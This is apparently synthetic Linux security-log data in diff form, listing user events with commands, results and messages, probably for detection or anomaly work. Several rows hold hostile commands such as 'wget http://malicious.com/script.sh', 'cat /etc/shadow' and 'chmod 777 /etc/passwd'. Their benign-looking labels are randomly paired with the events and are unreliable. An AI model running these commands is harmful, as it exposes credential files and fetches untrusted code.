+2025-05-03T11:10:17Z,U5932,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.40,99459,Access to sensitive file
+2025-05-06T11:50:17Z,U5674,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.75,33090,Segmentation fault
+2025-05-02T02:41:17Z,U6900,file_access,/etc/shadow,read,,success,10.0.0.25,33355,Normal command execution
+2025-05-01T15:39:17Z,U5288,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.131,67850,Administrative task
+2025-05-03T07:04:17Z,U8801,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.134,50469,Invalid argument
+2025-05-02T02:43:17Z,U1704,file_access,/etc/shadow,write,,failure,10.0.0.115,76303,Invalid argument
+2025-05-06T15:56:17Z,U2519,file_access,/etc/shadow,read,,success,10.0.0.93,76180,Administrative task
+2025-05-01T05:46:17Z,U6327,exec,/bin/sudo,run,sudo su,success,10.0.0.104,31197,Administrative task
+2025-05-02T00:34:17Z,U4544,file_access,/etc/shadow,read,,failure,10.0.0.2,78054,Permission denied
+2025-05-01T05:49:17Z,U8576,file_access,/etc/shadow,write,,success,10.0.0.99,42839,Routine system scan
+2025-05-01T15:24:17Z,U1480,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.186,27881,Access to sensitive file
+2025-05-03T18:43:17Z,U7297,exec,/bin/sudo,run,chmod 777 /etc/passwd,failure,10.0.0.83,93527,Permission denied
+2025-05-03T08:20:17Z,U1747,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.213,67177,Normal command execution
+2025-05-02T04:38:17Z,U8294,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.171,72836,Invalid argument
+2025-05-04T12:16:17Z,U2785,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.59,93883,Administrative task
+2025-05-01T09:23:17Z,U5472,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.23,82748,Access to sensitive file
+2025-05-02T12:21:17Z,U1351,file_access,/etc/shadow,read,,success,10.0.0.39,47178,Privileged command executed
+2025-05-04T18:16:17Z,U5752,exec,/usr/bin/top,run,sudo su,success,10.0.0.40,83582,Administrative task
+2025-05-01T06:59:17Z,U3693,file_access,/etc/passwd,read,,success,10.0.0.64,39990,Access to sensitive file
+2025-05-03T13:57:17Z,U5764,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.236,30604,Privileged command executed
+2025-05-02T14:03:17Z,U2285,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.50,64296,Administrative task
+2025-05-01T02:48:17Z,U2525,exec,/bin/bash,run,cat /etc/shadow,failure,10.0.0.15,62708,Command not found
+2025-05-06T17:54:17Z,U4634,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.83,70795,Administrative task
+2025-05-07T00:21:17Z,U9646,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.63,52161,Invalid argument
+2025-05-02T02:57:17Z,U4528,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.162,57785,Permission denied
+2025-05-05T21:47:17Z,U5508,file_access,/etc/passwd,write,,failure,10.0.0.5,20637,Execution blocked by policy
+2025-05-04T11:20:17Z,U9526,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.30,89448,Routine system scan
+2025-05-02T16:40:17Z,U6079,exec,/bin/sudo,run,sudo su,success,10.0.0.189,88568,Access to sensitive file
+2025-05-05T11:35:17Z,U1275,file_access,/etc/passwd,read,,success,10.0.0.200,97483,Administrative task
+2025-05-05T21:58:17Z,U4460,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.151,97974,Permission denied
+2025-05-01T22:51:17Z,U9299,file_access,/etc/shadow,write,,success,10.0.0.137,37936,Access to sensitive file
+2025-05-06T04:15:17Z,U8591,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.182,40129,Normal command execution
+2025-05-05T06:29:17Z,U7708,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.158,63866,Routine system scan
+2025-05-04T15:46:17Z,U7800,file_access,/etc/shadow,read,,failure,10.0.0.82,47494,Permission denied
+2025-05-06T09:06:17Z,U1654,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.139,97593,Normal command execution
+2025-05-07T03:17:17Z,U6436,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.163,96452,Routine system scan
+2025-05-04T16:18:17Z,U8092,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.103,56101,Normal command execution
+2025-05-04T23:14:17Z,U4074,file_access,/etc/shadow,write,,success,10.0.0.254,25009,Administrative task
+2025-05-01T07:08:17Z,U1036,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.143,27011,Invalid argument
+2025-05-03T01:12:17Z,U1913,file_access,/etc/shadow,read,,success,10.0.0.73,64688,Access to sensitive file
+2025-05-06T03:05:17Z,U5131,file_access,/etc/shadow,write,,success,10.0.0.221,95731,Administrative task
+2025-05-01T10:08:17Z,U8217,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.136,77623,Access to sensitive file
+2025-05-05T06:40:17Z,U8954,file_access,/etc/passwd,write,,success,10.0.0.252,96538,Privileged command executed
+2025-05-07T01:42:17Z,U5732,file_access,/etc/passwd,read,,failure,10.0.0.232,26260,Execution blocked by policy
+2025-05-05T11:38:17Z,U4251,file_access,/etc/shadow,read,,failure,10.0.0.88,22725,Command not found
+2025-05-01T04:45:17Z,U8293,file_access,/etc/passwd,write,,success,10.0.0.79,96594,Privileged command executed
+2025-04-30T15:19:17Z,U9447,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.230,11948,Privileged command executed
+2025-05-03T19:12:17Z,U4652,file_access,/etc/passwd,read,,success,10.0.0.193,32350,Privileged command executed
+2025-05-05T07:09:17Z,U6478,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.134,69949,Normal command execution
+2025-04-30T20:09:17Z,U6500,exec,/bin/bash,run,cat /etc/shadow,success,10.0.0.46,88027,Normal command execution
+2025-05-06T00:00:17Z,U5510,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.158,73665,Administrative task
+2025-04-30T17:33:17Z,U7190,file_access,/etc/shadow,write,,failure,10.0.0.74,83003,Command not found
+2025-05-03T16:36:17Z,U6914,file_access,/etc/passwd,write,,success,10.0.0.25,83054,Access to sensitive file
+2025-05-02T17:36:17Z,U6542,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.254,60248,Normal command execution
+2025-05-05T11:14:17Z,U9962,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.254,33171,Normal command execution
+2025-05-05T10:20:17Z,U2496,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.148,39757,Normal command execution
+2025-05-01T04:34:17Z,U1080,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.1,69441,Normal command execution
+2025-05-02T21:17:17Z,U1804,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.117,19141,Routine system scan
+2025-05-04T04:57:17Z,U9850,file_access,/etc/shadow,read,,success,10.0.0.224,68010,Privileged command executed
+2025-05-05T20:14:17Z,U1915,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.200,96952,Normal command execution
+2025-05-05T12:16:17Z,U2537,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.127,45413,Access to sensitive file
+2025-05-05T13:26:17Z,U6530,file_access,/etc/shadow,write,,success,10.0.0.133,73344,Privileged command executed
+2025-05-01T13:22:17Z,U4281,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.244,55155,Permission denied
+2025-04-30T15:28:17Z,U6319,file_access,/etc/passwd,read,,success,10.0.0.98,48204,Routine system scan
+2025-05-07T01:13:17Z,U6106,exec,/bin/bash,run,ls -al /etc,success,10.0.0.42,79190,Normal command execution
+2025-05-01T13:06:17Z,U4063,exec,/bin/sudo,run,ls -al /etc,failure,10.0.0.200,91443,Permission denied
+2025-05-05T06:12:17Z,U2454,file_access,/etc/shadow,read,,success,10.0.0.80,54171,Normal command execution
+2025-05-01T05:22:17Z,U4339,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.199,42728,Administrative task
+2025-05-02T00:05:17Z,U5431,file_access,/etc/passwd,read,,success,10.0.0.195,21658,Normal command execution
+2025-05-02T07:10:17Z,U8768,exec,/usr/bin/top,run,ls -al /etc,failure,10.0.0.30,83891,Command not found
+2025-05-01T10:57:17Z,U9837,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,34068,Access to sensitive file
+2025-05-01T17:09:17Z,U4262,file_access,/etc/shadow,read,,failure,10.0.0.202,12813,Permission denied
+2025-05-03T15:33:17Z,U5520,file_access,/etc/shadow,write,,failure,10.0.0.47,27726,Execution blocked by policy
+2025-05-05T10:08:17Z,U5242,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.89,52384,Segmentation fault
+2025-05-04T17:02:17Z,U9942,file_access,/etc/passwd,read,,success,10.0.0.86,73061,Administrative task
+2025-05-06T12:52:17Z,U3011,exec,/usr/bin/wget,run,ls -al /etc,failure,10.0.0.25,75591,Permission denied
+2025-05-02T18:36:17Z,U2986,file_access,/etc/passwd,write,,success,10.0.0.30,21028,Routine system scan
+2025-05-05T00:02:17Z,U3719,exec,/usr/bin/top,run,touch /tmp/testfile,success,10.0.0.231,30181,Access to sensitive file
+2025-05-04T16:55:17Z,U6803,file_access,/etc/shadow,write,,success,10.0.0.1,55161,Routine system scan
+2025-05-01T20:15:17Z,U2033,file_access,/etc/shadow,read,,failure,10.0.0.162,82468,Permission denied
+2025-04-30T12:42:17Z,U6639,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.8,59375,Access to sensitive file
+2025-05-02T04:52:17Z,U2964,file_access,/etc/passwd,write,,success,10.0.0.71,92092,Administrative task
+2025-05-04T13:55:17Z,U8000,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.216,74533,Normal command execution
+2025-05-04T17:00:17Z,U5862,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.99,55630,Normal command execution
+2025-05-05T01:05:17Z,U4002,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.178,87664,Normal command execution
+2025-05-06T15:32:17Z,U1971,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.107,68158,Routine system scan
+2025-05-02T20:45:17Z,U2522,file_access,/etc/passwd,write,,success,10.0.0.114,39531,Access to sensitive file
+2025-04-30T11:34:17Z,U9981,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.111,41121,Routine system scan
+2025-05-02T06:31:17Z,U8169,file_access,/etc/passwd,read,,success,10.0.0.252,74747,Routine system scan
+2025-04-30T19:43:17Z,U7853,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.169,82144,Routine system scan
+2025-05-06T08:30:17Z,U9140,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.206,68955,Routine system scan
+2025-05-03T20:34:17Z,U7118,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.176,64246,Administrative task
+2025-05-02T05:30:17Z,U4868,file_access,/etc/shadow,write,,failure,10.0.0.37,21859,Execution blocked by policy
+2025-05-02T23:49:17Z,U8445,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.145,93678,Permission denied
+2025-05-01T21:42:17Z,U2618,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,failure,10.0.0.205,17363,Segmentation fault
+2025-05-05T04:29:17Z,U8382,file_access,/etc/shadow,read,,success,10.0.0.237,12552,Privileged command executed
+2025-05-04T11:56:17Z,U7019,file_access,/etc/shadow,write,,success,10.0.0.211,98386,Administrative task
+2025-05-03T06:20:17Z,U9082,file_access,/etc/shadow,write,,success,10.0.0.14,40719,Access to sensitive file
+2025-05-06T08:11:17Z,U4833,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.190,74436,Privileged command executed
+2025-05-05T05:00:17Z,U5336,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.197,29019,Privileged command executed
+2025-05-02T11:36:17Z,U4947,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.189,60950,Access to sensitive file
+2025-05-06T12:57:17Z,U2913,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.152,10934,Privileged command executed
+2025-05-03T07:34:17Z,U2430,file_access,/etc/passwd,write,,success,10.0.0.122,24201,Routine system scan
+2025-05-04T09:09:17Z,U9739,file_access,/etc/shadow,read,,success,10.0.0.240,11378,Normal command execution
+2025-05-07T00:43:17Z,U5558,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.71,11056,Routine system scan
+2025-05-07T02:21:17Z,U3111,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.172,78700,Normal command execution
+2025-05-04T02:34:17Z,U5118,exec,/bin/bash,run,sudo su,success,10.0.0.217,99129,Administrative task
+2025-05-02T04:07:17Z,U4780,exec,/usr/bin/top,run,sudo su,success,10.0.0.113,76034,Normal command execution
+2025-05-01T00:53:17Z,U1717,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.204,23392,Command not found
+2025-05-03T04:28:17Z,U5773,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.187,30297,Invalid argument
+2025-05-05T10:33:17Z,U3315,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.141,32653,Access to sensitive file
+2025-05-01T04:28:17Z,U7737,file_access,/etc/shadow,read,,success,10.0.0.75,35548,Administrative task
+2025-05-02T14:59:17Z,U4645,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.201,78713,Administrative task
+2025-05-06T19:11:17Z,U4101,file_access,/etc/passwd,write,,success,10.0.0.197,51980,Administrative task
+2025-05-04T23:43:17Z,U7315,file_access,/etc/passwd,write,,failure,10.0.0.204,20380,Permission denied
+2025-05-04T03:56:17Z,U4484,file_access,/etc/passwd,read,,failure,10.0.0.222,92924,Invalid argument
+2025-05-06T20:36:17Z,U6966,file_access,/etc/passwd,read,,failure,10.0.0.132,35446,Command not found
+2025-05-01T15:49:17Z,U2885,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.81,89551,Normal command execution
+2025-05-05T01:08:17Z,U8613,file_access,/etc/shadow,write,,failure,10.0.0.42,40673,Permission denied
+2025-05-01T03:33:17Z,U5008,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.152,63046,Command not found
+2025-05-01T17:14:17Z,U5365,file_access,/etc/shadow,read,,success,10.0.0.152,47157,Privileged command executed
+2025-05-01T21:31:17Z,U3346,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.171,77786,Administrative task
+2025-05-05T03:59:17Z,U1123,exec,/bin/bash,run,ls -al /etc,success,10.0.0.249,43104,Access to sensitive file
+2025-05-04T19:51:17Z,U6029,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.234,40270,Privileged command executed
+2025-05-06T23:04:17Z,U7837,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.244,57065,Administrative task
+2025-05-02T11:10:17Z,U6001,file_access,/etc/passwd,write,,success,10.0.0.100,19295,Privileged command executed
+2025-04-30T10:35:17Z,U4680,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.17,81656,Execution blocked by policy
+2025-05-03T13:58:17Z,U1313,exec,/usr/bin/top,run,touch /tmp/testfile,failure,10.0.0.119,56214,Execution blocked by policy
+2025-05-06T04:27:17Z,U1244,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.60,20023,Routine system scan
+2025-05-05T06:07:17Z,U8579,file_access,/etc/passwd,write,,success,10.0.0.219,24369,Privileged command executed
+2025-05-04T22:19:17Z,U4555,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.113,33655,Administrative task
+2025-05-04T11:47:17Z,U3974,exec,/bin/bash,run,ls -al /etc,success,10.0.0.77,34834,Routine system scan
+2025-05-07T04:27:17Z,U7354,file_access,/etc/shadow,write,,success,10.0.0.48,34561,Routine system scan
+2025-05-07T01:24:17Z,U4440,file_access,/etc/shadow,write,,success,10.0.0.254,67554,Privileged command executed
+2025-05-03T05:44:17Z,U3544,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.217,40425,Normal command execution
+2025-05-03T17:01:17Z,U2866,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.248,24195,Permission denied
+2025-05-05T02:01:17Z,U9943,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.222,16700,Segmentation fault
+2025-05-01T19:02:17Z,U2719,exec,/bin/sudo,run,sudo su,failure,10.0.0.78,20345,Segmentation fault
+2025-05-01T15:35:17Z,U3288,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.133,52725,Administrative task
+2025-05-04T10:55:17Z,U6911,file_access,/etc/shadow,read,,success,10.0.0.160,71313,Administrative task
+2025-05-06T19:16:17Z,U7105,file_access,/etc/passwd,write,,failure,10.0.0.237,92444,Command not found
+2025-05-05T11:56:17Z,U2349,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.172,28179,Access to sensitive file
+2025-05-07T00:06:17Z,U9014,exec,/usr/bin/top,run,sudo su,success,10.0.0.126,68239,Administrative task
+2025-04-30T17:16:17Z,U8164,file_access,/etc/shadow,write,,failure,10.0.0.146,37897,Segmentation fault
+2025-05-07T00:46:17Z,U4328,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.90,87086,Access to sensitive file
+2025-05-04T14:55:17Z,U7504,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.27,26665,Administrative task
+2025-05-04T15:04:17Z,U8435,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.160,56476,Privileged command executed
+2025-04-30T17:20:17Z,U6051,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.154,89674,Administrative task
+2025-05-01T05:39:17Z,U1189,file_access,/etc/passwd,read,,failure,10.0.0.67,42262,Segmentation fault
+2025-05-04T02:31:17Z,U6362,file_access,/etc/passwd,write,,success,10.0.0.170,71884,Administrative task
+2025-05-03T08:41:17Z,U6911,file_access,/etc/shadow,write,,success,10.0.0.220,19813,Privileged command executed
+2025-05-02T15:36:17Z,U5325,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.105,11549,Administrative task
+2025-05-06T06:21:17Z,U3629,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.236,42800,Normal command execution
+2025-05-01T02:49:17Z,U5636,file_access,/etc/shadow,write,,success,10.0.0.214,39939,Administrative task
+2025-05-06T01:57:17Z,U5867,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.13,31131,Routine system scan
+2025-05-01T00:48:17Z,U4270,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.35,43110,Administrative task
+2025-05-05T16:40:17Z,U4967,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.237,54319,Privileged command executed
+2025-05-03T17:03:17Z,U3861,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.154,26588,Privileged command executed
+2025-05-05T11:40:17Z,U3035,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.20,61461,Normal command execution
+2025-05-05T10:26:17Z,U8026,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.24,80985,Routine system scan
+2025-05-05T15:27:17Z,U4372,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.238,79280,Routine system scan
+2025-05-05T21:49:17Z,U5681,exec,/usr/bin/wget,run,sudo su,success,10.0.0.250,35183,Administrative task
+2025-05-02T21:33:17Z,U3129,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.90,57920,Administrative task
+2025-05-05T16:21:17Z,U2733,file_access,/etc/passwd,write,,success,10.0.0.80,77117,Privileged command executed
+2025-05-05T21:34:17Z,U4834,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.81,47180,Privileged command executed
+2025-05-02T10:33:17Z,U9633,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.135,46246,Administrative task
+2025-05-05T07:40:17Z,U4758,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.195,54440,Routine system scan
+2025-05-01T03:05:17Z,U8746,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.119,39570,Routine system scan
+2025-05-03T00:40:17Z,U6621,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.194,13358,Administrative task
+2025-05-02T18:05:17Z,U9045,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.88,96138,Routine system scan
+2025-05-02T03:53:17Z,U1364,file_access,/etc/passwd,read,,success,10.0.0.249,91902,Administrative task
+2025-04-30T07:55:17Z,U2310,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.80,80537,Normal command execution
+2025-05-04T15:37:17Z,U1994,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.238,37188,Normal command execution
+2025-05-05T07:13:17Z,U6685,file_access,/etc/passwd,write,,success,10.0.0.52,25235,Routine system scan
+2025-05-06T03:35:17Z,U5728,file_access,/etc/passwd,read,,success,10.0.0.248,29717,Privileged command executed
+2025-05-03T21:35:17Z,U9008,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.169,28886,Routine system scan
+2025-05-01T19:42:17Z,U3310,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.97,13864,Invalid argument
+2025-05-03T18:01:17Z,U6558,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.206,93830,Access to sensitive file
+2025-05-02T22:03:17Z,U8709,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.251,28887,Permission denied
+2025-04-30T12:45:17Z,U6824,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.6,57919,Execution blocked by policy
+2025-05-02T03:34:17Z,U5591,file_access,/etc/shadow,read,,success,10.0.0.34,29698,Normal command execution
+2025-05-06T00:30:17Z,U1777,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.247,40554,Administrative task
+2025-05-05T14:38:17Z,U3798,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.110,55050,Routine system scan
+2025-05-01T22:02:17Z,U2538,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.132,54469,Routine system scan
+2025-05-06T09:02:17Z,U4222,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.235,74282,Privileged command executed
+2025-05-04T16:21:17Z,U5543,file_access,/etc/passwd,read,,success,10.0.0.67,10980,Normal command execution
+2025-04-30T20:05:17Z,U3506,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.29,22180,Routine system scan
+2025-05-02T16:41:17Z,U1284,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.44,15032,Routine system scan
+2025-05-01T01:31:17Z,U9075,file_access,/etc/shadow,read,,success,10.0.0.121,87174,Access to sensitive file
+2025-05-03T21:02:17Z,U2484,exec,/bin/bash,run,cat /etc/shadow,failure,10.0.0.102,63216,Command not found
+2025-05-05T09:15:17Z,U8479,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.120,93267,Access to sensitive file
+2025-05-07T04:03:17Z,U1560,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.123,86401,Command not found
+2025-05-01T02:31:17Z,U2229,file_access,/etc/shadow,write,,failure,10.0.0.213,78972,Execution blocked by policy
+2025-05-05T19:29:17Z,U8419,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.189,30407,Routine system scan
+2025-05-03T20:23:17Z,U9254,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.136,16390,Routine system scan
+2025-05-04T07:12:17Z,U1423,file_access,/etc/passwd,write,,success,10.0.0.83,17465,Routine system scan
+2025-05-05T18:23:17Z,U2771,file_access,/etc/shadow,read,,success,10.0.0.174,52633,Access to sensitive file
+2025-05-04T19:35:17Z,U3674,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.223,96298,Normal command execution
+2025-05-04T11:09:17Z,U4634,file_access,/etc/shadow,write,,success,10.0.0.84,17172,Access to sensitive file
+2025-05-03T10:24:17Z,U2827,file_access,/etc/passwd,read,,failure,10.0.0.121,78965,Permission denied
+2025-05-04T08:00:17Z,U9006,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.109,26814,Routine system scan
+2025-05-06T15:25:17Z,U2702,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.220,27535,Administrative task
+2025-05-01T11:55:17Z,U5425,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.42,93554,Normal command execution
+2025-05-02T22:10:17Z,U9920,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.184,20137,Segmentation fault
+2025-05-02T05:10:17Z,U6158,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.247,93493,Routine system scan
+2025-04-30T20:13:17Z,U9001,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.142,71204,Administrative task
+2025-05-07T02:06:17Z,U5783,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.177,22781,Administrative task
+2025-05-05T07:41:17Z,U7507,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.226,17731,Administrative task
+2025-05-01T10:44:17Z,U4592,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.61,86196,Routine system scan
+2025-05-01T16:36:17Z,U7510,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.144,39796,Access to sensitive file
+2025-05-02T15:50:17Z,U4021,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.180,64137,Privileged command executed
+2025-05-04T07:48:17Z,U8092,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.217,26985,Administrative task
+2025-05-03T16:09:17Z,U9351,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.149,49431,Administrative task
+2025-05-03T14:21:17Z,U4930,file_access,/etc/shadow,read,,success,10.0.0.170,68977,Normal command execution
+2025-04-30T08:44:17Z,U7677,file_access,/etc/passwd,write,,success,10.0.0.164,38256,Access to sensitive file
+2025-05-06T10:46:17Z,U7294,file_access,/etc/passwd,write,,success,10.0.0.167,65795,Administrative task
+2025-05-06T23:19:17Z,U7129,exec,/bin/sudo,run,ls -al /etc,failure,10.0.0.97,54558,Permission denied
+2025-05-01T19:18:17Z,U7364,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.192,93637,Privileged command executed
+2025-05-02T04:34:17Z,U1832,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.243,51239,Privileged command executed
+2025-05-03T02:22:17Z,U3645,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.128,89662,Execution blocked by policy
+2025-05-05T12:11:17Z,U7962,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.205,41052,Administrative task
+2025-05-05T17:01:17Z,U3393,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.155,52306,Administrative task
+2025-05-05T08:54:17Z,U2404,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.96,84143,Privileged command executed
+2025-05-04T02:00:17Z,U4948,file_access,/etc/shadow,write,,success,10.0.0.57,82423,Access to sensitive file
+2025-05-03T11:37:17Z,U5994,file_access,/etc/passwd,read,,failure,10.0.0.53,33604,Command not found
+2025-04-30T23:30:17Z,U1044,file_access,/etc/shadow,read,,failure,10.0.0.3,80437,Invalid argument
+2025-05-02T18:21:17Z,U7368,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.197,90534,Privileged command executed
+2025-05-01T08:35:17Z,U4866,file_access,/etc/shadow,read,,success,10.0.0.154,21145,Routine system scan
+2025-05-06T10:13:17Z,U1488,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.134,21142,Normal command execution
+2025-05-05T23:11:17Z,U2907,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.166,83372,Access to sensitive file
+2025-05-03T16:42:17Z,U6490,file_access,/etc/passwd,read,,success,10.0.0.73,30494,Administrative task
+2025-05-01T06:39:17Z,U5581,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.42,69496,Invalid argument
+2025-05-05T01:14:17Z,U5336,exec,/bin/sudo,run,ls -al /etc,failure,10.0.0.219,31220,Execution blocked by policy
+2025-05-04T09:54:17Z,U8435,file_access,/etc/shadow,write,,success,10.0.0.24,84957,Routine system scan
+2025-05-02T05:22:17Z,U1005,file_access,/etc/shadow,read,,failure,10.0.0.226,79351,Command not found
+2025-05-02T01:58:17Z,U6289,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.179,12765,Permission denied
+2025-05-06T21:18:17Z,U4175,exec,/bin/bash,run,cat /etc/shadow,success,10.0.0.37,47358,Administrative task
+2025-05-06T08:26:17Z,U7354,file_access,/etc/shadow,read,,success,10.0.0.91,24900,Access to sensitive file
+2025-05-06T07:17:17Z,U4005,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.92,77927,Normal command execution
+2025-05-02T19:54:17Z,U6797,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.133,21150,Access to sensitive file
+2025-05-04T04:12:17Z,U6450,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.170,48528,Administrative task
+2025-04-30T08:20:17Z,U5716,file_access,/etc/passwd,write,,success,10.0.0.202,53503,Administrative task
+2025-04-30T17:57:17Z,U8433,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.248,75419,Access to sensitive file
+2025-05-05T11:52:17Z,U6910,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.64,70069,Privileged command executed
+2025-05-02T23:48:17Z,U7899,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.57,50774,Administrative task
+2025-05-03T00:24:17Z,U5814,file_access,/etc/passwd,read,,success,10.0.0.212,84212,Privileged command executed
